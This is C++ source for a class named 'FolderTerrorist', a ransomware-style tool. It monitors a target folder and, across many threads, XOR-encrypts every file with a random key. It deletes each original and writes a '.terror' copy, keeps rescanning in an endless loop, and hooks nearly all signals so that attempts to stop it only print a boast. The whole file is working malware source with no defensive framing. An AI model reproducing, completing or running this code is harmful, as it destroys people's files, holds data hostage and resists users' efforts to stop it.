#include "FolderTerrorist.h"
#include <filesystem>
#include <fstream>

std::vector<uint8_t> keygen(size_t size) {
    std::vector<uint8_t> key;
    for(size_t i = 0; i < size; i++) {
        key.push_back(rand());
    }
    return key;
}

FolderTerrorist::FolderTerrorist() {
    std::cout << "FolderTerrorist has been created!\n";
}

void FolderTerrorist::SetFolderName(const std::string &folder_name) {
    this->folder_name = folder_name;
}

const std::string &FolderTerrorist::GetFolderName() const {
    return folder_name;
}

std::vector<std::string> FolderTerrorist::GetFolderFiles() {
    std::cout << "scanning directory...\n";
    std::vector<std::string> files;
    for (auto &file: std::filesystem::directory_iterator(GetFolderName())) {
        files.push_back(file.path().string());
    }
    return files;
}

void FolderTerrorist::SetKey(std::vector<uint8_t> key) {
    this->key = key;
}

std::vector<uint8_t> FolderTerrorist::GetKey() {
    if(key.size() != 0){
        return key;
    } else {
        key = keygen(15);
        return key;
    }
}

void FolderTerrorist::UpdateQueue() {
    if(border == -1) {
        while (true) {
            std::this_thread::sleep_for(std::chrono::seconds(2));
            ReleaseUpdate();
        }
    } else ReleaseUpdate();
}

void FolderTerrorist::ReleaseUpdate() {
    std::vector<std::string> folder_files = GetFolderFiles();
    for (const auto &file: folder_files) {
        if (std::find(files_queue.begin(), files_queue.end(), file) == files_queue.end()) {
            std::lock_guard<std::mutex> guard(mtx);
            std::cout << "A new file has been added to the queue: " << file << "\n";
            files_queue.push_front(file);
        }
    }
}

void FolderTerrorist::ReleaseQueue(std::string mode) {
    std::string filename;
    if(border == -1) {
        while (true) {
            RealaseMode(filename, mode);
        }
    } else {
        while (border > 0) {
            RealaseMode(filename, mode);
            std::lock_guard<std::mutex> guard(border_mtx);
            if(border > 0) border--;
        }
    }
}

void FolderTerrorist::RealaseMode(std::string filename, std::string mode) {
    {
        std::lock_guard<std::mutex> guard(mtx);
        if (!files_queue.empty()) {
            filename = files_queue.back();
            files_queue.pop_back();
        }
    }
    if(mode == "encryption") {
        if (std::filesystem::exists(std::filesystem::path(filename)) &&
        !filename.ends_with(".terror")) {
            XORencryption(filename);
        }
    }
    if(mode == "decryption") {
        if (std::filesystem::exists(std::filesystem::path(filename)) &&
        filename.ends_with(".terror")) {
            XORencryption(filename);
        }
    }
}

void FolderTerrorist::XORencryption(const std::string &file_path) {
    std::ifstream ifs(file_path, std::ios::binary);
    ifs.seekg(0, ifs.end);
    size_t file_size = ifs.tellg();
    ifs.seekg(0, ifs.beg);
    std::vector<uint8_t> bytes_buff(file_size);
    char *data_ptr = static_cast<char *>((void*)bytes_buff.data());
    ifs.read(data_ptr, file_size);
    ifs.close();
    std::remove(file_path.c_str());

    std::vector<uint8_t> key = GetKey();
    for(size_t i = 0; i < bytes_buff.size();) {
        for(size_t j = 0; j < key.size(); j++) {
            bytes_buff[i] ^= key[j];
            i++;
            if(i == bytes_buff.size()) break;
        }
    }

    size_t last_point_pos = file_path.find_last_of(".");
    std::string ext = file_path.substr(last_point_pos);
    std::filesystem::path path;
    if(ext != ".terror") {
        path = std::filesystem::path(file_path).parent_path() / std::filesystem::path(std::filesystem::path(file_path).filename().string() + ".terror");
    }
    if(ext == ".terror") {
        std::string decrypted_file = file_path.substr(0, last_point_pos);
        path = std::filesystem::path(file_path).parent_path() / std::filesystem::path(std::filesystem::path(decrypted_file).filename().string());
    }

    std::ofstream ofs(path, std::ios::binary);
    ofs.write(data_ptr, bytes_buff.size());
    ofs.close();
}

void FolderTerrorist::Start(std::string mode) {
    if(!folder_name.empty()) this->Start(GetFolderName(), mode);
    else throw std::runtime_error("error: failed to start FolderTerrorist: target folder name is empty");
}

void FolderTerrorist::Start(std::string path, std::string mode) {
    if(mode != "encryption" && mode != "decryption")throw std::runtime_error("error: unknown start mode, try \"encryption\" or \"decryption\" mode");
    this->folder_name = path;
    std::cout << "target is: " << GetFolderName() << std::endl;
    int max_num_of_threads = std::thread::hardware_concurrency();
    threads.emplace_back(&FolderTerrorist::UpdateQueue, this);
    if(border != -1){
        threads[0].join();
    }
    for (int i = 0; i < max_num_of_threads - 1; i++) {
        threads.emplace_back(&FolderTerrorist::ReleaseQueue, this, mode);
    }
    if(border == -1){
        threads[0].join();
    }
    for (int i = 1; i < threads.size(); i++) {
        threads[i].join();
    }
}

void FolderTerrorist::SetTheBorder(int border) {
    this->border = border;
}

void FolderTerrorist::SignalsCatching() {
    for(int i = 1; i < 32; i++) std::signal(i, SignalsHandler);
}

void FolderTerrorist::SignalsHandler(int signal) {
    std::cout << "FolderTerrorist is invincible!!!" <<"\n";
}